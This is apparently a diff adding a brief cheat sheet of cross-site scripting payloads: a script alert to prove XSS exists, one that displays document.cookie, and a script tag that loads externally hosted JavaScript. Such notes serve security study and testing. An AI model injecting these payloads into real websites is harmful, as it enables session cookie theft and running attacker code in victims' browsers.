@@ -1,0 +1,8 @@
+#########################
+# Injection attacks	#
+#########################
+
+<script> alert("1"); </script>		- Used to show a popup - standard for proving whether XSS exists
+<script> alert(document.cookie);	- Used to show the current cookie for the session
+<script/type="text/javascript"/src="url_to_load"></script> 		- Used to load externally hosted javascript
+
